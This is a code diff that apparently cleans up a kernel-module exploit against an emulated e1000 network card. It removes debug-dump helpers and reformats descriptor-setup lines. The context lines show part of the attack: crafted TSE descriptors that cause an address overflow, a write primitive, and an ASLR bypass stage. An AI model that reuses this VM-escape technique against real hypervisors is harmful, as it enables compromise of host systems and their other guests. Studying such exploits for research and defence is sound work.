@@ -30,8 +30,6 @@ static uint8_t* map_mmio(void);
 static void e1k_configure(void);
 static void address_overflow(uint16_t new_addr);
 static void write_primitive(uint16_t address, uint16_t value);
-static void dump_reg(char* regname, uint16_t reg);
-static void dump_memory(void* buffer, int size);
 static uint64_t aslr_bypass(void);
 
 /* ==================== GLOBAL VARIABLES DECLARATION ====================== */
@@ -141,11 +139,11 @@ static void address_overflow(uint16_t new_addr)
 	uint32_t	tdt;
 	uint64_t 	physical_address;
 
-	struct e1000_context_desc*	context_1	= 	&(tx_ring[idx+0].context);
-	struct e1000_data_desc*		data_2		= 	&(tx_ring[idx+1].data);
-	struct e1000_data_desc*		data_3		= 	&(tx_ring[idx+2].data);
-	struct e1000_context_desc*	context_4	= 	&(tx_ring[idx+3].context);
-	struct e1000_data_desc*		data_5		= 	&(tx_ring[idx+4].data);
+	struct e1000_context_desc*	context_1	= &(tx_ring[idx+0].context);
+	struct e1000_data_desc*		data_2		= &(tx_ring[idx+1].data);
+	struct e1000_data_desc*		data_3		= &(tx_ring[idx+2].data);
+	struct e1000_context_desc*	context_4	= &(tx_ring[idx+3].context);
+	struct e1000_data_desc*		data_5		= &(tx_ring[idx+4].data);
 
 	//------------- Payload setup -------------//
 	
@@ -173,27 +171,27 @@ static void address_overflow(uint16_t new_addr)
 	//----------- Descriptors setup -----------//
 	physical_address = virt_to_phys(tx_buffer);
 
-	context_1->lower_setup.ip_config	= 	(uint32_t) 0;
-	context_1->upper_setup.tcp_config	= 	(uint32_t) 0;
-	context_1->cmd_and_length			= 	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
-	context_1->tcp_seg_setup.data		= 	(uint32_t) (MSS_DEFAULT);
+	context_1->lower_setup.ip_config	= (uint32_t) 0;
+	context_1->upper_setup.tcp_config	= (uint32_t) 0;
+	context_1->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
+	context_1->tcp_seg_setup.data		= (uint32_t) (MSS_DEFAULT);
 
-	data_2->buffer_addr					= 	(uint64_t) physical_address;
-	data_2->lower.data					= 	(uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
-	data_2->upper.data					= 	(uint32_t) 0;
+	data_2->buffer_addr					= (uint64_t) physical_address;
+	data_2->lower.data					= (uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
+	data_2->upper.data					= (uint32_t) 0;
 
-	data_3->buffer_addr					= 	(uint64_t) physical_address;
-	data_3->lower.data					= 	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
-	data_3->upper.data					= 	(uint32_t) 0;
+	data_3->buffer_addr					= (uint64_t) physical_address;
+	data_3->lower.data					= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
+	data_3->upper.data					= (uint32_t) 0;
 
-	context_4->lower_setup.ip_config	=	(uint32_t) 0;
-	context_4->upper_setup.tcp_config	=	(uint32_t) 0;
-	context_4->cmd_and_length			=	(uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
-	context_4->tcp_seg_setup.data		=	(uint32_t) ((0xF << 16));
+	context_4->lower_setup.ip_config	= (uint32_t) 0;
+	context_4->upper_setup.tcp_config	= (uint32_t) 0;
+	context_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
+	context_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));
 
-	data_5->buffer_addr					=	(uint64_t) physical_address;
-	data_5->lower.data					=	(uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
-	data_5->upper.data					= 	(uint32_t) 0;
+	data_5->buffer_addr					= (uint64_t) physical_address;
+	data_5->lower.data					= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
+	data_5->upper.data					= (uint32_t) 0;
 	//-----------------------------------------//
 
 	//--------- Fetch new descriptors ---------//
@@ -302,31 +300,8 @@ static void write_primitive(uint16_t address, uint16_t value)
 
 }
 
-/** dump_reg : dump specific register
- * @param regname	register name
- * @param reg		register
- */
-static void dump_reg(char* regname, uint16_t reg)
+static uint64_t aslr_bypass(void)
 {
-	uint32_t value = get_register(reg);
-	pr_info("%-15s  %08x\n", regname, value);
-}
-
-/** dump_memory : dump part of the memory
- * @param buffer
- * @param size
- */
-static void dump_memory(void* buffer, int size)
-{
-	int i;
-
-	pr_info("Dumping memory at : %016llx\n", buffer);
-	for (i = 0; i < size; ++i) {
-		pr_info("%02x", *((uint8_t*)buffer + i));
-	}
-}
-
-static uint64_t aslr_bypass(void) {
     pr_info("##### Stage 1 #####\n");
 
     // e1000_disable_loopback_mode(mmio);
